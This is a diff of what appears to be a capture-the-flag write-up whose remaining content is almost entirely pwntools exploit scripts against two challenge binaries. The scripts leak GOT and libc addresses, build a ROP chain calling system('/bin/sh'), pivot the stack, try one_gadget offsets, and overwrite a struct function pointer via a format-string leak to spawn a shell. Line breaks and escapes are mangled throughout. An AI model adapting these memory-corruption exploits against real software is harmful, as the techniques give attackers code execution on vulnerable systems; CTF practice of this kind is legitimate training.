@@ -26,59 +26,14 @@ frompwn import *context.log_level = 'debug'context.arch='amd64'#sh = gdb.debug("
 
 ```
 #!/usr/bin/env pythonfrompwn import *context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)#sh = process("./pwn")sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")got_write = elf.got["write"]sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")sh.interactive()
-```
-
-
-
-```
 sh.sendafter("sure?", p64(got_write)+"A"*8+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8+"G"*8+"H"*8+"I"*8+"J"*8+"K"*8)
-```
-
-
-
-```
 sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(0x4010D0))
-```
-
-
-
-```
 #!/usr/bin/env pythonfrompwnimport*context.log_level ='debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']#sh = remote('xxx',8080)sh = process("./pwn")#sh = gdb.debug("./pwn","b mainnb Businessnb *0x40139anb *0x40130en c")elf = ELF("./pwn")libc = ELF("./libc.so.6")rop = ROP(libc)got_write = elf.got["write"]libc_write = libc.sym['write']start =0x4010D0leave =0x4013C8ret =0x4013C9#start1sh.send("A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write)+"A"*0x50+p64(start))sh.sendlineafter("you?","0")sh.sendlineafter("save?","10")write_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("write_addr: "+hex(write_addr))base_addr = write_addr - libc_writeprint("base_addr: "+hex(base_addr))stack_addr = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")print("stack_addr:"+hex(stack_addr))system = base_addr + libc.sym["system"]binsh = base_addr + libc.search("/bin/sh").next()pop_rdi = base_addr + rop.find_gadget(['pop rdi','ret'])[0]#start2sh.sendafter("x00x00n","A"*20)sh.sendlineafter("you?","1")sh.sendlineafter("withdraw?","10")sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) +"A"*40+ p64(stack_addr -360) + p64(leave))sh.interactive()
-```
-
-
-
-```
-#sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + "A"*40 + p64(stack_addr - 360) + p64(leave))one=[0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]sh.sendafter("sure?", p64(got_write) +"A"*0x48 + p64(stack_addr -0x98) + p64(one[6] + base_addr))
-```
-
-
-
-```
+    #sh.sendafter("sure?", p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + "A"*40 + p64(stack_addr - 360) + p64(leave))one=[0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]sh.sendafter("sure?", p64(got_write) +"A"*0x48 + p64(stack_addr -0x98) + p64(one[6] + base_addr))
 structptr_obj{intstate;charpad0[4];charname[32];intattr1;intattr2;chardesc[32];void(__fastcall *func)(char*);};
-```
-
-
-
-```
 frompwn import *context.log_level = 'debug'context.arch='amd64'sh= gdb.debug("./pwn","b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")#sh = process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+"B"*8+"C"*8+"D"*8+"E"*8+"F"*8)sh.sendlineafter("2c9n","1")sh.interactive()
-```
-
-
-
-```
 base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAputs_plt= base_text+0x1140puts_got= base_text+0x3F88sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"C"*8+"D"*8+"E"*8+ p64(puts_plt))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n",p64(puts_got))sh.sendlineafter("2c9n","1")sh.interactive()
-```
-
-
-
-```
 base_text=int(sh.recvuntil("2c9")[-12:],16)-0x12c9print("base_text:"+hex(base_text))ret=base_text+0x12FAstart=base_text+0x11e0sh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+p64(ret)+"B"*24+p64(start))sh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")sh.sendlineafter("2c9n","1")sh.interactive()
-```
-
-
-
-```
 frompwn import *context.log_level = 'debug'context.arch='amd64'#sh = gdb.debug("./pwn", "b *0x55555555580bnb *0x555555555997nb *0x555555555642n c")sh= process("./pwn")libc= ELF("./libc.so.6")#1 dog#0x555555555642#2 cat#0x55555555580b#3 bird#0x555555555997#ptr#0x55555555b2a0base_text= int(sh.recvuntil("2c9")[-12:],16) -0x12c9print("base_text:"+hex(base_text))ret= base_text+0x12FAstart= base_text+0x11e0#bird ptr->func=startsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret) +"B"*24+ p64(start))#cat ptr->name=%23psh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","%23$p")#dog call ptr->func=startsh.sendlineafter("2c9n","1")base_libc= int(sh.recvuntil("d90")[-12:],16) -0x29d90print("base_libc:"+hex(base_libc))system= base_libc + libc.sym["system"]#bird ptr->func=systemsh.sendlineafter("n","3")sh.sendlineafter("x90x97n","yes")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","A"*4+ p64(ret)+"B"*24+ p64(system))#cat ptr->name=/bin/shsh.sendlineafter("2c9n","2")sh.sendlineafter("xbcx9fn","yes")sh.sendlineafter("x90xa7n","/bin/shx00")#dog call ptr->func=systemsh.sendlineafter("2c9n","1")#sh.interactive()
 ```
 
